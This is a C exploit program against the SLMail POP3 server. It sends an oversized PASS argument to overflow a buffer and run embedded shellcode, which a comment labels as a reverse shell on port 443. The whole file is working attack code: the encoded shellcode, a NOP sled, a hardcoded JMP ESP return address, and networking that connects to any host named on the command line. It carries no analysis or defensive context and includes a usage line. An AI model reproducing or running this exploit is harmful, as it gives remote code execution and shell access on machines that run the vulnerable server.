/*
SLMAIL REMOTE PASSWD BOF - Ivan Ivanovic Ivanov Иван-дурак
недействительный 31337 Team
*/

#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

// [*] reverse 443
unsigned char shellcode[] = 
"\xb8\x6f\xb1\xa5\xba\xd9\xce\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1"
"\x52\x31\x45\x12\x83\xc5\x04\x03\x2a\xbf\x47\x4f\x48\x57\x05"
"\xb0\xb0\xa8\x6a\x38\x55\x99\xaa\x5e\x1e\x8a\x1a\x14\x72\x27"
"\xd0\x78\x66\xbc\x94\x54\x89\x75\x12\x83\xa4\x86\x0f\xf7\xa7"
"\x04\x52\x24\x07\x34\x9d\x39\x46\x71\xc0\xb0\x1a\x2a\x8e\x67"
"\x8a\x5f\xda\xbb\x21\x13\xca\xbb\xd6\xe4\xed\xea\x49\x7e\xb4"
"\x2c\x68\x53\xcc\x64\x72\xb0\xe9\x3f\x09\x02\x85\xc1\xdb\x5a"
"\x66\x6d\x22\x53\x95\x6f\x63\x54\x46\x1a\x9d\xa6\xfb\x1d\x5a"
"\xd4\x27\xab\x78\x7e\xa3\x0b\xa4\x7e\x60\xcd\x2f\x8c\xcd\x99"
"\x77\x91\xd0\x4e\x0c\xad\x59\x71\xc2\x27\x19\x56\xc6\x6c\xf9"
"\xf7\x5f\xc9\xac\x08\xbf\xb2\x11\xad\xb4\x5f\x45\xdc\x97\x37"
"\xaa\xed\x27\xc8\xa4\x66\x54\xfa\x6b\xdd\xf2\xb6\xe4\xfb\x05"
"\xb8\xde\xbc\x99\x47\xe1\xbc\xb0\x83\xb5\xec\xaa\x22\xb6\x66"
"\x2a\xca\x63\x28\x7a\x64\xdc\x89\x2a\xc4\x8c\x61\x20\xcb\xf3"
"\x92\x4b\x01\x9c\x39\xb6\xc2\xa9\xb6\xb8\x2d\xc6\xca\xb8\x50"
"\xad\x42\x5e\x38\xc1\x02\xc9\xd5\x78\x0f\x81\x44\x84\x85\xec"
"\x47\x0e\x2a\x11\x09\xe7\x47\x01\xfe\x07\x12\x7b\xa9\x18\x88"
"\x13\x35\x8a\x57\xe3\x30\xb7\xcf\xb4\x15\x09\x06\x50\x88\x30"
"\xb0\x46\x51\xa4\xfb\xc2\x8e\x15\x05\xcb\x43\x21\x21\xdb\x9d"
"\xaa\x6d\x8f\x71\xfd\x3b\x79\x34\x57\x8a\xd3\xee\x04\x44\xb3"
"\x77\x67\x57\xc5\x77\xa2\x21\x29\xc9\x1b\x74\x56\xe6\xcb\x70"
"\x2f\x1a\x6c\x7e\xfa\x9e\x9c\x35\xa6\xb7\x34\x90\x33\x8a\x58"
"\x23\xee\xc9\x64\xa0\x1a\xb2\x92\xb8\x6f\xb7\xdf\x7e\x9c\xc5"
"\x70\xeb\xa2\x7a\x70\x3e"; //315 length

void exploit(int sock) {
      FILE *test;
      int *ptr;
      char userbuf[] = "USER madivan\r\n";
      char evil[2970];//3001
      char buf[2981];//3012
      char receive[1024];
      char nopsled[] = "\x90\x90\x90\x90\x90\x90\x90\x90";
      memset(buf, 0x00, 2981);
      memset(evil, 0x00, 2969);
      memset(evil, 0x43, 2968);
      ptr = &evil;
      ptr = ptr + 652; // 2608 (2607+4)/4
      memcpy(ptr, &nopsled, 8);
      ptr = ptr + 4;
      memcpy(ptr, &shellcode, 315);
      *(long*)&evil[2606] = 0x5f4a358f; // JMP ESP XP 7CB41020 FFE4 JMP ESP

      // banner
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // user
      printf("[+] Sending Username...\n");
      send(sock, userbuf, strlen(userbuf), 0);
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // passwd
      printf("[+] Sending Evil buffer...\n");
      sprintf(buf, "PASS %s\r\n", evil);
      //test = fopen("test.txt", "w");
      //fprintf(test, "%s", buf);
      //fclose(test);
      send(sock, buf, strlen(buf), 0);
      printf("[*] Done! Connect to the host on port 443...\n\n");
}

int connect_target(char *host, u_short port)
{
    int sock = 0;
    struct hostent *hp;
    WSADATA wsa;
    struct sockaddr_in sa;

    WSAStartup(MAKEWORD(2,0), &wsa);
    memset(&sa, 0, sizeof(sa));

    hp = gethostbyname(host);
    if (hp == NULL) {
        printf("gethostbyname() error!\n"); exit(0);
    }
    printf("[+] Connecting to %s\n", host);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr = **((struct in_addr **) hp->h_addr_list);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)      {
        printf("[-] socket blah?\n");
        exit(0);
        }
    if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) < 0)
        {printf("[-] connect() blah!\n");
        exit(0);
          }
    printf("[+] Connected to %s\n", host);
    return sock;
}


int main(int argc, char **argv)
{
    int sock = 0;
    int data, port;
    printf("\n[$] SLMail Server POP3 PASSWD Buffer Overflow exploit\n");
    printf("[$] by Mad Ivan [ void31337 team ] - http://exploit.void31337.ru\n\n");
    if ( argc < 2 ) { printf("usage: slmail-ex.exe <host> \n\n"); exit(0); }
    port = 110;
    sock = connect_target(argv[1], port);
    exploit(sock);
    closesocket(sock);
    return 0;
}
